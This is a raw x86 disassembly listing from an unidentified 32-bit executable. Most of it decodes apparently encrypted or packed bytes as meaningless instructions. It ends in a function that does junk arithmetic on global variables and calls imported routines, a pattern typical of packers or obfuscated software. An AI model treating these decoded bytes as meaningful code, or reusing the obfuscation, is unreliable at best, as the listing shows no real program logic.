  40d080:	jg     0x40d033
  40d082:	inc    di
  40d084:	jmp    DWORD PTR [ecx-0x17]
  40d087:	adc    DWORD PTR [eax],0x50
  40d08a:	push   es
  40d08b:	mov    BYTE PTR [edx+eax*8+0x30],ch
  40d08f:	hlt    
  40d090:	clc    
  40d091:	xor    eax,0x457271da
  40d096:	pop    ds
  40d097:	stos   DWORD PTR es:[edi],eax
  40d098:	pop    eax
  40d099:	gs loope 0x40d07a
  40d09c:	adc    ecx,DWORD PTR [esi+esi*8+0x2da4d3b3]
  40d0a3:	cmp    ebx,DWORD PTR [ebx-0x26bb6c3f]
  40d0a9:	aas    
  40d0aa:	lea    ebp,[esi]
  40d0ac:	push   es
  40d0ad:	or     eax,0x897a3b6a
  40d0b2:	sti    
  40d0b3:	mov    al,0x8
  40d0b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d0b6:	sub    DWORD PTR [ecx],edi
  40d0b8:	xchg   ebp,eax
  40d0b9:	cmc    
  40d0ba:	jecxz  0x40d10c
  40d0bc:	cmc    
  40d0bd:	jbe    0x40d064
  40d0bf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d0c0:	ret    
  40d0c1:	loope  0x40d0b5
  40d0c3:	mov    eax,0x5726d427
  40d0c8:	sbb    al,0x2d
  40d0ca:	pop    edi
  40d0cb:	inc    ebx
  40d0cc:	pop    ecx
  40d0cd:	mov    ch,0xc4
  40d0cf:	or     DWORD PTR [edi+ebx*2-0x5d],esp
  40d0d3:	mov    eax,0x79d050ae
  40d0d8:	imul   esi,DWORD PTR [eax-0x499eac0c],0xffffffb9
  40d0df:	jle    0x40d06c
  40d0e1:	dec    ebp
  40d0e2:	mov    DWORD PTR [esp+esi*1-0x37],ebx
  40d0e6:	push   es
  40d0e7:	push   cs
  40d0e8:	scas   al,BYTE PTR es:[edi]
  40d0e9:	mov    bl,0x67
  40d0eb:	xchg   edi,eax
  40d0ec:	pop    ecx
  40d0ed:	frstor [edx]
  40d0ef:	adc    eax,0xe071a7fc
  40d0f4:	and    ch,ch
  40d0f6:	imul   esp,DWORD PTR [eax],0xfffffffa
  40d0f9:	sahf   
  40d0fa:	mov    ebx,0x506764e
  40d0ff:	ret    
  40d100:	mov    dh,0xf8
  40d102:	pop    esi
  40d103:	retf   0x9c14
  40d106:	aas    
  40d107:	add    ch,BYTE PTR ds:0xaacb9fc7
  40d10d:	and    dh,bh
  40d10f:	or     dl,BYTE PTR [eax-0x25339b9a]
  40d115:	dec    ebx
  40d116:	pop    ds
  40d117:	mov    ebx,0x4db22f45
  40d11c:	mov    ebp,0x9127dd9
  40d121:	sbb    DWORD PTR [ecx-0x650d7b55],edx
  40d127:	cmp    al,0xf8
  40d129:	jmp    0xcf673cb3
  40d12e:	ins    DWORD PTR es:[edi],dx
  40d12f:	xor    BYTE PTR [ecx-0x3d696e2e],0xe
  40d136:	les    edi,FWORD PTR [esi+0x236df98f]
  40d13c:	dec    esp
  40d13d:	cmp    ebp,DWORD PTR [eax+0x77]
  40d140:	popf   
  40d141:	dec    eax
  40d142:	and    eax,0xe2bc83b3
  40d147:	rcl    BYTE PTR [edi],1
  40d149:	dec    ebx
  40d14a:	call   0xb890:0xf1515ad5
  40d151:	aam    0x57
  40d153:	(bad)  
  40d154:	mov    bh,0xdb
  40d156:	imul   eax,DWORD PTR [esi+0x3e],0xffffffa8
  40d15a:	pop    edi
  40d15b:	push   es
  40d15c:	call   0xb657:0xf3b97c85
  40d163:	push   edx
  40d164:	pop    ecx
  40d165:	jge    0x40d134
  40d167:	xchg   edi,eax
  40d168:	leave  
  40d169:	popf   
  40d16a:	fst    QWORD PTR [eax+ebp*4-0x69]
  40d16e:	sbb    DWORD PTR [edx],edx
  40d170:	repz jmp 0x5dac:0xaa959d81
  40d178:	mov    dh,0x33
  40d17a:	das    
  40d17b:	mov    ch,0x45
  40d17d:	inc    eax
  40d17e:	imul   ebp,DWORD PTR [ebp-0x23],0x3b
  40d182:	sub    al,0x2a
  40d184:	test   DWORD PTR [edi+eax*4-0x54e45388],esp
  40d18b:	pop    es
  40d18c:	repz sub al,0xb4
  40d18f:	jae    0x40d19c
  40d191:	push   es
  40d192:	push   edi
  40d193:	(bad)  
  40d194:	icebp  
  40d195:	div    DWORD PTR [eax+0x38875d15]
  40d19b:	push   ebp
  40d19c:	pop    es
  40d19d:	pop    edi
  40d19e:	into   
  40d19f:	outs   dx,DWORD PTR ds:[esi]
  40d1a0:	rcl    DWORD PTR [ebx+esi*2-0x1d722c7],1
  40d1a7:	fld    QWORD PTR [esi+eax*2]
  40d1aa:	jp     0x40d18c
  40d1ac:	pop    ss
  40d1ad:	daa    
  40d1ae:	jbe    0x40d142
  40d1b0:	adc    ebx,DWORD PTR ds:0xc3c3915d
  40d1b6:	xor    cl,BYTE PTR [edi-0x4e]
  40d1b9:	call   0x4e4f70f0
  40d1be:	or     esp,DWORD PTR [eax+0x6c]
  40d1c1:	mov    bh,al
  40d1c3:	rcr    ebx,1
  40d1c5:	mov    dh,0xc2
  40d1c7:	out    0xc,eax
  40d1c9:	repz repz add eax,0xd6525a80
  40d1d0:	inc    ebx
  40d1d1:	xchg   ebp,eax
  40d1d2:	xchg   edi,eax
  40d1d3:	mov    al,ds:0x9baf3677
  40d1d8:	push   0xab11f4f0
  40d1dd:	mov    WORD PTR [ebx],?
  40d1df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d1e0:	(bad)  
  40d1e2:	in     al,0x6
  40d1e4:	inc    ebx
  40d1e5:	xchg   esi,eax
  40d1e6:	jge    0x40d1de
  40d1e8:	pop    edx
  40d1e9:	mov    cl,0x49
  40d1eb:	aaa    
  40d1ec:	aam    0xc3
  40d1ee:	push   ecx
  40d1ef:	mov    DWORD PTR [esi-0x63],0xd8c0e8a7
  40d1f6:	add    dh,BYTE PTR [eax+edi*1]
  40d1f9:	inc    eax
  40d1fa:	pop    ebx
  40d1fb:	imul   ebx,DWORD PTR [edx],0xffffff81
  40d1fe:	push   0x248d8d79
  40d203:	sahf   
  40d204:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d205:	jo     0x40d20a
  40d207:	fsubrp st(3),st
  40d209:	jecxz  0x40d22d
  40d20b:	das    
  40d20c:	sbb    BYTE PTR [eax],0xd4
  40d20f:	push   0xdde3f00f
  40d214:	mul    al
  40d216:	js     0x40d26e
  40d218:	retf   0x2487
  40d21b:	das    
  40d21c:	xor    eax,DWORD PTR [ecx-0x5a633db1]
  40d222:	xchg   ecx,eax
  40d223:	jnp    0x40d295
  40d225:	xor    bl,BYTE PTR [esi]
  40d227:	mov    esi,0xfc96c376
  40d22c:	jo     0x40d20a
  40d22e:	inc    ecx
  40d22f:	xchg   ebx,eax
  40d230:	mov    dh,0x9d
  40d232:	adc    ebp,DWORD PTR [eax-0x23]
  40d235:	sbb    DWORD PTR [edi-0x43],0x251de67f
  40d23c:	(bad)  
  40d23d:	mov    ah,0xd6
  40d23f:	xchg   BYTE PTR [ebx],bh
  40d241:	xchg   esi,eax
  40d242:	push   es
  40d243:	retf   
  40d244:	jmp    0x75153bfa
  40d249:	xor    eax,ecx
  40d24b:	inc    edx
  40d24c:	or     BYTE PTR [esi+0x22bc6007],ah
  40d252:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d253:	mov    eax,0x14a9b80f
  40d258:	xor    al,0xd3
  40d25a:	das    
  40d25b:	js     0x40d2b6
  40d25d:	imul   DWORD PTR [eax]
  40d25f:	push   es
  40d260:	out    dx,al
  40d261:	dec    esi
  40d262:	sbb    BYTE PTR [esi],ah
  40d264:	inc    edi
  40d265:	mov    al,ds:0x6e318b
  40d26a:	rol    BYTE PTR [edi+0x31845e2d],1
  40d270:	fucomp st(7)
  40d272:	mov    gs,WORD PTR [ebx+eax*2-0x1d]
  40d276:	loope  0x40d21e
  40d278:	jmp    0xe8c6:0xaa067f11
  40d27f:	cmp    BYTE PTR [esi-0x597408],0x0
  40d286:	mov    ch,0xb3
  40d288:	into   
  40d289:	xchg   edx,eax
  40d28a:	loope  0x40d247
  40d28c:	dec    ecx
  40d28d:	cld    
  40d28e:	mov    edi,0x736ee332
  40d293:	ror    esp,0xd2
  40d296:	ds aas 
  40d298:	adc    esp,edi
  40d29a:	je     0x40d30f
  40d29c:	mov    ebp,0x95ba5e48
  40d2a1:	inc    esi
  40d2a2:	pop    ds
  40d2a3:	out    dx,al
  40d2a4:	std    
  40d2a5:	fistp  WORD PTR [ebx+ebx*8+0x748bab87]
  40d2ac:	or     DWORD PTR [esi+eiz*8+0x61],ebp
  40d2b0:	xor    edi,edi
  40d2b2:	mov    ecx,ebx
  40d2b4:	sbb    eax,0x72c5b94b
  40d2b9:	popf   
  40d2ba:	aaa    
  40d2bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d2bc:	or     al,dl
  40d2be:	scas   eax,DWORD PTR es:[edi]
  40d2bf:	nop
  40d2c0:	dec    DWORD PTR [edi]
  40d2c2:	mov    BYTE PTR [ebx],bl
  40d2c4:	mov    edi,0x8c18e53d
  40d2c9:	aas    
  40d2ca:	cld    
  40d2cb:	add    DWORD PTR [ebx+ecx*8],eax
  40d2ce:	enter  0xf158,0x89
  40d2d2:	lock mov edi,0xf6bff537
  40d2d8:	cli    
  40d2d9:	sahf   
  40d2da:	shr    DWORD PTR [ebx-0x23c5b29d],1
  40d2e0:	pop    es
  40d2e1:	sar    DWORD PTR [ecx-0x53031516],cl
  40d2e7:	sub    dh,bl
  40d2e9:	or     BYTE PTR [ebp+0x77],ch
  40d2ec:	jno    0x40d2b5
  40d2ee:	add    ah,ah
  40d2f0:	pop    edx
  40d2f1:	sbb    eax,0x1e982253
  40d2f6:	daa    
  40d2f7:	and    eax,0xe23fc08f
  40d2fc:	sahf   
  40d2fd:	cmp    eax,0x1e0dec18
  40d302:	xchg   DWORD PTR ds:0x38bbec0d,ecx
  40d308:	cmp    eax,0x38b41115
  40d30d:	cmp    edx,esi
  40d30f:	sub    al,0x15
  40d311:	nop
  40d312:	push   esi
  40d313:	(bad)  
  40d314:	cmc    
  40d315:	xor    al,ch
  40d317:	ja     0x40d2e8
  40d319:	xchg   ecx,eax
  40d31a:	dec    edi
  40d31b:	ror    DWORD PTR [ebx],0x4d
  40d31e:	outs   dx,BYTE PTR ds:[esi]
  40d31f:	leave  
  40d320:	dec    esi
  40d321:	test   eax,0x534c6c26
  40d326:	leave  
  40d327:	jg     0x40d317
  40d329:	sbb    al,0x15
  40d32b:	inc    esp
  40d32c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d32d:	and    cl,BYTE PTR [eax-0x46]
  40d330:	into   
  40d331:	int    0x1a
  40d333:	fucomp st(2)
  40d335:	mov    esi,0x2316a4d6
  40d33a:	ror    DWORD PTR [eax-0x14b050a8],0x1c
  40d341:	jge    0x40d2e6
  40d343:	mov    ch,dl
  40d345:	sub    esi,ebp
  40d347:	cwde   
  40d348:	das    
  40d349:	(bad)  
  40d34a:	mov    ds:0x7c0e5a43,al
  40d34f:	sbb    al,0xbd
  40d351:	jae    0x40d2f6
  40d353:	pop    ecx
  40d354:	repnz mov cl,0x28
  40d357:	push   ecx
  40d359:	jle    0x40d31e
  40d35b:	cmp    BYTE PTR [eax-0x516e8e4],0x6c
  40d362:	xabort 0xd2
  40d365:	push   ecx
  40d366:	cld    
  40d367:	mov    dl,0x8a
  40d369:	lock js 0x40d372
  40d36c:	sub    DWORD PTR [ebx],ebx
  40d36e:	in     eax,0xfd
  40d370:	jo     0x40d387
  40d372:	arpl   di,cx
  40d374:	adc    edi,DWORD PTR [eax]
  40d376:	call   0xf437c2
  40d37b:	pop    esi
  40d37c:	outs   dx,BYTE PTR ds:[esi]
  40d37d:	sub    BYTE PTR [eax],dl
  40d37f:	mov    esp,0x33b6c711
  40d384:	xchg   esi,eax
  40d385:	mov    edi,DWORD PTR [ebp-0xc]
  40d388:	xor    edi,eax
  40d38a:	sub    edx,edi
  40d38c:	mov    edi,DWORD PTR [ebp-0xc]
  40d38f:	mov    ebx,DWORD PTR [ebp-0x14]
  40d392:	xor    edi,eax
  40d394:	add    edi,ecx
  40d396:	imul   edi,ebx
  40d399:	mov    ebx,DWORD PTR [ebp-0x18]
  40d39c:	xor    ebx,eax
  40d39e:	sub    edx,ecx
  40d3a0:	lea    edi,[edi+ebx*1+0x32729a]
  40d3a7:	cmp    edi,edx
  40d3a9:	jbe    0x40c541
  40d3af:	mov    edx,DWORD PTR [ebp-0xc]
  40d3b2:	mov    edi,DWORD PTR [ebp-0x24]
  40d3b5:	jmp    0x40d728
  40d3ba:	mov    ebx,0xd1887f92
  40d3bf:	popf   
  40d3c0:	dec    ebx
  40d3c1:	pop    ebp
  40d3c2:	stc    
  40d3c3:	ss push edi
  40d3c5:	xchg   ebp,eax
  40d3c6:	jmp    0x7c98:0x6f9c1fc5
  40d3cd:	jl     0x40d399
  40d3cf:	jns    0x40d44d
  40d3d1:	jl     0x40d393
  40d3d3:	idiv   DWORD PTR [edi-0x5f7853aa]
  40d3d9:	sub    DWORD PTR [edi],edi
  40d3db:	inc    eax
  40d3dc:	fld    TBYTE PTR [edi+ecx*1-0xc]
  40d3e0:	ds jle 0x40d3de
  40d3e3:	test   eax,0x6fc7f6e7
  40d3e8:	and    ch,cl
  40d3ea:	xor    DWORD PTR [ecx-0x9f18ea2],edx
  40d3f0:	retf   
  40d3f1:	jne    0x40d451
  40d3f3:	sbb    eax,0x27c81e55
  40d3f8:	std    
  40d3f9:	sub    cl,ch
  40d3fb:	jne    0x40d408
  40d3fd:	jo     0x40d42e
  40d3ff:	enter  0x8b56,0xdb
  40d403:	cmp    ah,ah
  40d405:	test   eax,0x5bdd088d
  40d40a:	pop    ebp
  40d40b:	mov    dl,0xfa
  40d40d:	repz or DWORD PTR [edi],ebx
  40d410:	es aas 
  40d412:	cmp    eax,0x1cc46f1c
  40d417:	mov    al,ds:0x1dcd3c52
  40d41c:	mov    eax,0x51a0527d
  40d421:	enter  0x5266,0xf8
  40d425:	mov    WORD PTR [eax+0x18],?
  40d428:	jmp    0x40d433
  40d42a:	std    
  40d42b:	push   esp
  40d42c:	push   es
  40d42d:	dec    edx
  40d42e:	aam    0x18
  40d430:	adc    ch,BYTE PTR [edi-0x37a40607]
  40d436:	jmp    0x40d3e0
  40d438:	mov    esi,0x13bc5f0e
  40d43d:	cmc    
  40d43e:	or     BYTE PTR [ecx],dl
  40d440:	sbb    ecx,edx
  40d442:	mov    esp,0xda6670b0
  40d447:	cmp    DWORD PTR [eax-0x15],0xffffffa0
  40d44b:	clc    
  40d44c:	fucom  st(1)
  40d44e:	and    eax,0xe16cef7a
  40d453:	ret    0xc3fd
  40d456:	or     bl,ah
  40d458:	std    
  40d459:	(bad)  
  40d45a:	clc    
  40d45b:	out    dx,al
  40d45c:	es loop 0x40d433
  40d45f:	outs   dx,BYTE PTR ds:[esi]
  40d460:	jge    0x40d464
  40d462:	and    DWORD PTR [ebx+0x1b],ebx
  40d465:	loop   0x40d4c3
  40d467:	xchg   edx,esp
  40d469:	cmc    
  40d46a:	cmp    al,0xd4
  40d46c:	jg     0x40d429
  40d46e:	mov    dh,0x87
  40d470:	bound  esi,QWORD PTR [edi]
  40d472:	call   0x35d1:0x15812db3
  40d479:	mov    bh,0x78
  40d47b:	rol    BYTE PTR [edi+0x70],0xc9
  40d47f:	imul   esp,edi,0x4549a1b5
  40d485:	hlt    
  40d486:	call   0x3da8:0x4592b4fc
  40d48d:	jae    0x40d4af
  40d48f:	sub    BYTE PTR [edi-0x22ab0611],0x75
  40d496:	fcomp  DWORD PTR [edi+0x45a4f6ec]
  40d49c:	inc    ebx
  40d49d:	adc    cl,BYTE PTR [ebx-0x7f8bc610]
  40d4a3:	shl    BYTE PTR [ecx],0x6b
  40d4a6:	rcl    DWORD PTR [edx],0x84
  40d4a9:	(bad)  [ebx-0x657d3057]
  40d4af:	jmp    0xbf9fe0db
  40d4b4:	pop    es
  40d4b5:	fsub   st(7),st
  40d4b7:	jo     0x40d510
  40d4b9:	mov    ds:0xb851280,al
  40d4be:	loopne 0x40d4c6
  40d4c0:	loope  0x40d465
  40d4c2:	mov    al,0x75
  40d4c4:	ret    0x6b80
  40d4c7:	xlat   BYTE PTR ds:[ebx]
  40d4c8:	xchg   esp,eax
  40d4c9:	das    
  40d4ca:	mov    edx,0x1e38336e
  40d4cf:	mov    BYTE PTR [ebx+0x31],0x46
  40d4d3:	cmp    eax,0x135c6b8e
  40d4d8:	adc    al,0x69
  40d4da:	fild   QWORD PTR [ecx-0x216d03e1]
  40d4e0:	xor    DWORD PTR [eax-0x6f389e93],esi
  40d4e6:	fstp   QWORD PTR [edx+0x2f1b50ff]
  40d4ec:	fbld   TBYTE PTR [ecx+0x6f]
  40d4ef:	inc    ebp
  40d4f0:	cli    
  40d4f1:	ins    BYTE PTR es:[edi],dx
  40d4f2:	sub    eax,0xb6c392c9
  40d4f7:	popf   
  40d4f8:	pop    edi
  40d4f9:	stos   DWORD PTR es:[edi],eax
  40d4fa:	mov    bl,0x8e
  40d4fc:	pop    ebx
  40d4fd:	jo     0x40d563
  40d4ff:	sbb    al,al
  40d501:	jmp    0x89731615
  40d506:	pushf  
  40d507:	adc    DWORD PTR [esi],esp
  40d509:	scas   eax,DWORD PTR es:[edi]
  40d50a:	ja     0x40d56c
  40d50c:	xchg   ecx,eax
  40d50d:	xor    al,0x42
  40d50f:	xor    DWORD PTR [edx+0xd],ecx
  40d512:	xchg   esi,eax
  40d513:	xchg   esi,eax
  40d514:	add    DWORD PTR [edi],esi
  40d516:	mov    ss,edx
  40d518:	arpl   WORD PTR [edi-0x6f4890f0],ax
  40d51e:	(bad)  
  40d51f:	out    0xb7,al
  40d521:	inc    esp
  40d522:	out    dx,al
  40d523:	fidiv  DWORD PTR [edx-0x5e]
  40d526:	mov    al,0xc9
  40d528:	jge    0x40d4ad
  40d52a:	call   0xab1f:0x51fd2145
  40d531:	loope  0x40d53a
  40d533:	fsubrp st(7),st
  40d535:	jnp    0x40d52f
  40d537:	scas   al,BYTE PTR es:[edi]
  40d538:	adc    edi,DWORD PTR [edi-0x7c]
  40d53b:	out    dx,al
  40d53c:	dec    ebx
  40d53d:	int    0xf0
  40d53f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d540:	xchg   BYTE PTR [ecx-0x4d],dl
  40d543:	stc    
  40d544:	sub    ebx,eax
  40d546:	inc    esp
  40d547:	out    0xbb,al
  40d549:	jg     0x40d547
  40d54b:	add    BYTE PTR [edi],dh
  40d54d:	inc    edi
  40d54e:	scas   al,BYTE PTR es:[edi]
  40d54f:	adc    bl,bh
  40d551:	fisttp WORD PTR [esi]
  40d553:	pop    ss
  40d554:	xchg   ebp,eax
  40d555:	cld    
  40d556:	sbb    eax,0x98c747f
  40d55b:	outs   dx,BYTE PTR ds:[esi]
  40d55c:	call   0x3b58:0xcbaa70d7
  40d563:	test   BYTE PTR [ebx-0x7],dh
  40d566:	out    0xe6,eax
  40d568:	jmp    0x5187:0x55cf7700
  40d56f:	push   edi
  40d570:	retf   
  40d571:	or     eax,0x7d047b14
  40d576:	test   al,0x8f
  40d578:	dec    esi
  40d579:	or     esi,DWORD PTR ds:0x7ac0536
  40d57f:	loope  0x40d53b
  40d581:	into   
  40d582:	adc    eax,0x793fbbd3
  40d587:	push   ecx
  40d588:	outs   dx,DWORD PTR ds:[esi]
  40d589:	pusha  
  40d58a:	repnz rol DWORD PTR [ebp+0x115a9f7e],1
  40d591:	test   al,0x63
  40d593:	lods   eax,DWORD PTR ds:[esi]
  40d594:	cmp    edi,0xffffffc8
  40d597:	pop    edx
  40d598:	sar    DWORD PTR [edi+0x66],1
  40d59b:	add    esi,eax
  40d59d:	ds jge 0x40d5a9
  40d5a0:	dec    esp
  40d5a1:	repnz and DWORD PTR [edi],eax
  40d5a4:	xor    DWORD PTR [eax-0x67],eax
  40d5a7:	add    al,0xe2
  40d5a9:	rcr    DWORD PTR [eax],1
  40d5ab:	push   ebp
  40d5ac:	dec    edi
  40d5ad:	rol    BYTE PTR [esi-0x4],0xec
  40d5b1:	fcomp  QWORD PTR [eax+ecx*4+0x5bdab02b]
  40d5b8:	xchg   ecx,eax
  40d5b9:	(bad)  
  40d5ba:	and    ecx,DWORD PTR [eax]
  40d5bc:	jle    0x40d5ea
  40d5be:	lahf   
  40d5bf:	push   ebx
  40d5c0:	sub    ebp,edi
  40d5c2:	pushf  
  40d5c3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d5c4:	push   ss
  40d5c5:	ret    
  40d5c6:	pop    ss
  40d5c7:	adc    al,0x17
  40d5c9:	sbb    ebx,DWORD PTR [ecx-0x44]
  40d5cc:	in     eax,dx
  40d5cd:	ficom  DWORD PTR [edx+0x71]
  40d5d0:	aaa    
  40d5d1:	mov    esp,0xd92d6088
  40d5d6:	push   eax
  40d5d7:	mov    ch,0x45
  40d5d9:	retf   0x5ffe
  40d5dc:	push   esi
  40d5dd:	push   esi
  40d5de:	(bad)  
  40d5df:	and    eax,DWORD PTR [esi-0x6f537aab]
  40d5e5:	mov    ebp,0xff1c4eb1
  40d5ea:	dec    ebx
  40d5eb:	pop    edi
  40d5ec:	imul   esp,DWORD PTR ds:[eax+0x63ba461],0xffffff87
  40d5f4:	into   
  40d5f5:	adc    esi,eax
  40d5f7:	(bad)  
  40d5f8:	bound  edx,QWORD PTR [ecx-0x13]
  40d5fb:	stc    
  40d5fc:	push   ecx
  40d5fd:	jmp    0x40d63b
  40d5ff:	(bad)  
  40d600:	scas   eax,DWORD PTR es:[edi]
  40d601:	mov    esi,0x3da325f2
  40d606:	mov    esi,0x272da9c2
  40d60b:	fs pop ebx
  40d60d:	test   BYTE PTR [edx-0x7f],ah
  40d610:	fidivr WORD PTR [esi-0x2d]
  40d613:	cwde   
  40d614:	call   0x13ad7964
  40d619:	inc    esi
  40d61a:	outs   dx,DWORD PTR ds:[esi]
  40d61b:	dec    esp
  40d61c:	dec    edx
  40d61d:	pop    edx
  40d61e:	bound  esp,QWORD PTR [esi-0x52855410]
  40d624:	xlat   BYTE PTR ds:[ebx]
  40d625:	in     al,dx
  40d626:	push   0xb
  40d628:	jb     0x40d626
  40d62a:	inc    ecx
  40d62b:	jbe    0x40d5bb
  40d62d:	mov    bh,0xe0
  40d62f:	ds call 0x9f1079b0
  40d635:	sti    
  40d636:	out    0xf3,al
  40d638:	xchg   edi,eax
  40d639:	clc    
  40d63a:	adc    eax,0x3287348e
  40d63f:	iret   
  40d640:	sar    DWORD PTR [ecx+0x3],cl
  40d643:	mov    cl,cl
  40d645:	retf   0x70c8
  40d648:	jmp    0x562d:0x65e55427
  40d64f:	mov    edi,0x75852f3b
  40d654:	xor    al,BYTE PTR [edi]
  40d656:	pop    edi
  40d657:	dec    edi
  40d658:	push   ds
  40d659:	push   es
  40d65a:	std    
  40d65b:	std    
  40d65c:	jnp    0x40d667
  40d65e:	and    dl,BYTE PTR [eax+0xe9ddb31]
  40d664:	or     ch,BYTE PTR [si+0x207b]
  40d669:	scas   al,BYTE PTR es:[edi]
  40d66a:	mov    bl,0x16
  40d66c:	sub    BYTE PTR [esi+0x3ed4c263],0x53
  40d673:	push   0x0
  40d675:	mov    edx,0x51921de2
  40d67a:	stos   BYTE PTR es:[edi],al
  40d67b:	leave  
  40d67c:	and    BYTE PTR [ebp-0x443df643],0xe6
  40d683:	xchg   edx,eax
  40d684:	inc    ebp
  40d685:	push   esp
  40d686:	rcl    DWORD PTR [esi+0x66],1
  40d689:	adc    cl,BYTE PTR [ebp-0x34]
  40d68c:	xchg   ebx,eax
  40d68d:	sub    BYTE PTR [ecx-0x54],dl
  40d690:	xchg   ax,ax
  40d692:	push   eax
  40d693:	mov    ah,0xff
  40d695:	push   esp
  40d696:	mov    edx,0xcc5a3d53
  40d69b:	cdq    
  40d69c:	call   0x893a:0x687c19f
  40d6a3:	enter  0xc2eb,0xb1
  40d6a7:	arpl   WORD PTR [eax-0xd1d85e1],ax
  40d6ad:	mov    ebx,0x7ccaed2d
  40d6b2:	pop    edi
  40d6b3:	xor    ch,BYTE PTR [edi]
  40d6b5:	adc    DWORD PTR [eax],ecx
  40d6b7:	jbe    0x40d6b5
  40d6b9:	shl    cl,cl
  40d6bb:	fcom   DWORD PTR [edi-0x6a]
  40d6be:	(bad)  
  40d6bf:	mov    eax,ds:0x33eed8e3
  40d6c4:	push   ebx
  40d6c5:	aas    
  40d6c6:	dec    ecx
  40d6c7:	jnp    0x40d69f
  40d6c9:	arpl   WORD PTR [ebx-0x7b],di
  40d6cc:	or     DWORD PTR [esi+edi*4],eax
  40d6cf:	mov    edi,0x227da04c
  40d6d4:	aas    
  40d6d5:	or     ah,dh
  40d6d7:	or     al,0x3c
  40d6d9:	les    edi,FWORD PTR [edi]
  40d6db:	jns    0x40d67a
  40d6dd:	and    al,0x23
  40d6df:	xor    BYTE PTR [ebp-0x44],ch
  40d6e2:	inc    BYTE PTR [esi]
  40d6e4:	xchg   esi,eax
  40d6e6:	sub    DWORD PTR [ebp-0x2e],esi
  40d6e9:	xchg   ebp,eax
  40d6ea:	popf   
  40d6eb:	mov    ds:0x4e6309c4,eax
  40d6f0:	stc    
  40d6f1:	xchg   ebp,eax
  40d6f2:	pop    ds
  40d6f3:	xor    al,0x5
  40d6f5:	loope  0x40d6ca
  40d6f7:	scas   al,BYTE PTR es:[edi]
  40d6f8:	cmc    
  40d6f9:	mov    ah,0xcd
  40d6fb:	rcl    DWORD PTR [ecx+0x73],cl
  40d6fe:	iret   
  40d6ff:	jle    0x40d77a
  40d701:	enter  0xf56f,0x8c
  40d705:	gs ret 
  40d707:	xor    ebp,DWORD PTR [ebp+0x76647cc7]
  40d70d:	jge    0x40d6ec
  40d70f:	rcl    BYTE PTR [edi-0x31],0x70
  40d713:	adc    al,0x8e
  40d715:	divps  xmm6,xmm7
  40d718:	sub    eax,0xb4dbfd94
  40d71d:	xchg   ebx,eax
  40d71e:	inc    ecx
  40d71f:	ja     0x40d6cb
  40d721:	mov    dl,BYTE PTR [ebx]
  40d723:	inc    ebp
  40d724:	or     al,0xee
  40d726:	dec    eax
  40d727:	imul   esi,DWORD PTR [ebx],0xfd103d0
  40d72d:	scas   eax,DWORD PTR es:[edi]
  40d72e:	xlat   BYTE PTR ds:[ebx]
  40d72f:	mov    edi,DWORD PTR [ebp-0x18]
  40d732:	xor    edi,eax
  40d734:	add    edx,edi
  40d736:	mov    edi,DWORD PTR [ebp-0x8]
  40d739:	lea    edx,[edx+edi*1+0x32729a]
  40d740:	mov    DWORD PTR [ebp-0x8],edx
  40d743:	mov    edx,DWORD PTR [ebp-0x20]
  40d746:	xor    edx,eax
  40d748:	mov    edi,0xffcd8d66
  40d74d:	sub    edi,edx
  40d74f:	add    edi,DWORD PTR [ebp-0x10]
  40d752:	mov    edx,DWORD PTR [ebp-0x20]
  40d755:	mov    ebx,DWORD PTR [ebp-0x8]
  40d758:	xor    edx,eax
  40d75a:	add    edx,ecx
  40d75c:	imul   edx,ebx
  40d75f:	cmp    edx,edi
  40d761:	jbe    0x40a06e
  40d767:	pop    ebx
  40d768:	pop    edi
  40d769:	leave  
  40d76a:	ret    0x8
  40d76d:	push   ebp
  40d76e:	mov    ebp,esp
  40d770:	sub    esp,0xa8
  40d776:	and    DWORD PTR ds:0x43359b,0x6624
  40d780:	push   ebx
  40d781:	adc    DWORD PTR ds:0x433563,0x6b43
  40d78b:	push   esi
  40d78c:	push   edi
  40d78d:	sbb    DWORD PTR ds:0x43361f,0x4335a7
  40d797:	push   0x413c96
  40d79c:	sub    DWORD PTR ds:0x43354b,0x433663
  40d7a6:	call   DWORD PTR ds:0x412194
  40d7ac:	push   0x413cbe
  40d7b1:	sub    DWORD PTR ds:0x433623,0x43353f
  40d7bb:	call   DWORD PTR ds:0x412174
  40d7c1:	test   eax,eax
  40d7c3:	je     0x40d7d1
  40d7c9:	push   0x2
  40d7cb:	pop    eax
  40d7cc:	jmp    0x40e1cc
  40d7d1:	and    DWORD PTR ds:0x4335b3,0x0
  40d7db:	xor    ecx,ecx
  40d7dd:	xor    ecx,DWORD PTR ds:0x4335b3
  40d7e3:	inc    ecx
  40d7e4:	mov    DWORD PTR ds:0x4335b3,ecx
  40d7ea:	cmp    DWORD PTR ds:0x4335b3,0x24
  40d7f1:	jne    0x40d80b
  40d7f7:	push   DWORD PTR [ebp-0x28]
  40d7fa:	push   DWORD PTR [ebp-0x20]
  40d7fd:	push   0x38c3
  40d802:	push   DWORD PTR [ebp-0x14]
  40d805:	call   DWORD PTR ds:0x412274
  40d80b:	cmp    DWORD PTR ds:0x4335b3,0x1e
  40d812:	jb     0x40d7db
  40d818:	or     DWORD PTR ds:0x433547,0x433667
  40d822:	mov    DWORD PTR [ebp-0x24],0xf89c8535
  40d829:	dec    ecx
  40d82a:	mov    DWORD PTR [ebp-0x4],0xf89c8534
  40d831:	add    ecx,ecx
  40d833:	lea    eax,[ebp-0x2c]
  40d836:	and    DWORD PTR ds:0x43354f,0x0
  40d840:	jmp    0x40d852
  40d845:	mov    ecx,DWORD PTR ds:0x43354f
  40d84b:	inc    ecx
  40d84c:	mov    DWORD PTR ds:0x43354f,ecx
  40d852:	cmp    DWORD PTR ds:0x43354f,0x10
  40d859:	jae    0x40d899
  40d85f:	cmp    DWORD PTR ds:0x43354f,0x4
  40d866:	jne    0x40d87a
  40d86c:	push   0x42d1
  40d871:	push   DWORD PTR [ebp-0x28]
  40d874:	call   DWORD PTR ds:0x4121a0
  40d87a:	cmp    DWORD PTR ds:0x43354f,0x3
  40d881:	jne    0x40d894
  40d887:	mov    ecx,DWORD PTR ds:0x43354f
